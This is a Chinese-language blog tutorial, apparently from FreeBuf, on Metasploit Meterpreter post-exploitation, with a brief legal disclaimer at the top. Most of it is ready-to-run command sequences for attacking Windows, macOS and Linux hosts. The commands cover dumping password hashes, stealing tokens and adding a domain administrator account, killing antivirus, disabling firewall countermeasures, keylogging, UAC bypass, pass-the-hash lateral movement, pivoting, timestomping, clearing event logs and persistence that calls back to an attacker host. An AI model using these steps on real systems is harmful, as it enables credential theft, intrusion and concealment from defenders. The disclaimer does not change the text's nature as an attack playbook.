***严正声明：本文仅限于技术讨论与分享，严禁用于非法途径。**

hi，大家好。对于小白来说，metasploit无非就只有set ，run
，use。。。而且目前市面上人家写的大部分和msf有关文章都是抄袭的，完全没有技术含量。这让很多小白都很苦恼。

今天就让我来和大家介绍一下msf的进阶，我保证，这些内容在网上基本没有。而且我会详细，全面的为大家介绍。

![](https://image.3001.net/images/20210806/1628211796_610c8a547bcc00ce19d55.png!small)

## metasploit后渗透攻击阶段命令

 **1\. 在win主机上面使用meterpreter提取**

use priv 然后 getsystem

 **2\. 从一个给定进程id中盗取一个域管理员组令牌，添加一个域账户并且添加到域管理员组中**

ps & steal_token 1784 & shell & net user metasploit
[p@55w0rd](mailto:p@55w0rd)/ADD /DOMAIN & net group "Domain Admins" metasploit
/ADD /DOMAIN

 **3.从SAM数据库导出密码哈希值**

use priv & getsystem & hashdump

 **4.自动迁移到一个独立线程**

run migrate

 **5.通过脚本的killav来杀死杀毒软件进程**

run killav

 **6.针对一个特定进程来捕获键盘记录**

ps & migrate 1436 & keyscan_start & keyscan_dump & keyscan_stop

 **7.使用匿名方式来假冒管理员**

use incognito & list_tokens -u & use priv & getsystem & list_tokens -u &
impersonate_token IHAZSECRITY\\\Administrator

 **8\. 关闭防火墙以及其发现我们的防护措施**

run getcountermeasure & run getcountermeasure -h & run getcountermeasure -d -k

 **9.识别是否是虚拟机**

run checkvm

 **10.让meterp。。在后台运行**

background

 **11.绕过win用户账户限制（uac）**

run /post/windows/escalate/bypassuac

 **12.导出苹果口令哈希值**

run post/osx/gether/hashdump

 **13.导出linux口令哈希值**

run post/linux/gather/hashdump

![](https://image.3001.net/images/20210806/1628213297_610c90315cccddcab51e3.png!small)

## 挖掘用户名和密码

这里我们会用hashdump模块，来提取密码哈希值。win储存哈希的方式一般是LANManger (LM)
NTLANManger(NTML)或者v2，具体我就不介绍了。

### 获取哈希值

在目标系统设置一个密码，然后重新获取目标系统上面的用户名和密码哈希，我们在获取sam（安全账号管理器）的时候，我们要在system权限下。以绕过注册表的限制。获取受保护的sam存储。

use priv & run post/windows/gather/hashdump

### 传递哈希值

虽然我们获取了哈希值，但是不可能短时间破解。那么，不知道明文，如何攻击更多机器呢？

这里我们可以用哈希值传递技术。不要明文密码

use windows/smb/psexec & set payload..set lhost...set lport.... & set SMBPass
XXXXXXXXXXXXX & exploit

我们把SMBPss变量设置成之前的哈希值，就可以直接通过认证！然后我们就可以实现从一个节点到另外一个节点来攻击！

## 令牌假冒

这里我们会获取目标系统的一个kerberos令牌，将其用在身份认证环节，来冒充当初创建这个令牌的用户，令牌冒充是msf的强大功能之一对渗透测试十分有帮助

这里我们先用ps列出，我们所在域的名字是A，域管理员的用户名为admin

然后我们可以用steal_token 380 来盗取管理员令牌。

用use incognito来加载incognito模块，然后通过list_token -u
来列举系统可以利用的令牌，然后就会管理员账号，随后我们成功扮演了admin临牌并且添加一个新的用户给它管理员权限

impersonate_token admin

add_user omgcompromised [p@55w0rd!](mailto:p@55w0rd!)-h 192.168.33.50
(域控制器为192.168.33.50)

add_group_user "Domain Admins" omgcompromised -h 192.168.33.50

![](https://image.3001.net/images/20210806/1628215850_610c9a2a23179b69f6664.png!small)

## 通过跳板攻击

我们假设通过入侵已经获得了某个服务器的访问权限，此时我们应该关注的是如何与目标网络建立连接，我们将使用在scripts/meterpreter目录中的外部脚本，他们可以提供而外的功能

run get_local_subnets & backgrounds & route add 192.168.33.0 255.255.255.0.1 &
route print

我们这里用run get_local_subnets展示受控系统本地子网，然后用route print显示当前活跃路由设置，添加

...................................................................

同时，我们可以用内置的scanner/portscan/tcp通过msf来使用已经建立的链路

在我们入侵系统后使用route add命令为攻击会话添加路由，如果想要更加自动化的完成这个操作，可以选择load auto_add_route命令

## 隐身~~~

这里我只会稍微说一下。这里我要提一下msf的几个特性。timestomp(msf的一个插件，支持你去修改文件属性。。）和event_manager

### timestomp

timestomp C:\\\boot.ini -b

我们修改了时间戳，当我们用分析工具时，这些时间戳都会显示空白

### event_manager

run event_manager

清除日志

## 其他拓展

 **1.查看目标机器所有流量**

run packetrecorder -i 1

 **2.赚取系统信息**

通过scraper脚本可以获取如何信息，用户密码，下载全部注册表，密码哈希，收集系统信息和输出HKCU

run scraper

 **3.控制持久化**

run persistence -X -i 50 -p 443 -r 192.168.33.129

-x开机自启 -i50每50秒重新连接一次

 **4.像后渗透攻击模块转变**

run post/windows/gather/hashdump

 **5.通过附加railgun组件操作windows api**

lib

 **6.附件链接**

https://www.freebuf.com/sectool/282737.html（关于metasploit的木马免杀，维持以及进程迁移）

这些均首发于freebuf

![](https://image.3001.net/images/20210806/1628218620_610ca4fc7af571a896290.jpg!small)

好了，今天就到这里，我是铁汉fhoenix，希望今天的内容对你有帮助~

![](https://image.3001.net/images/20210806/1628217815_610ca1d79c5a20c870d73.jpg!small)

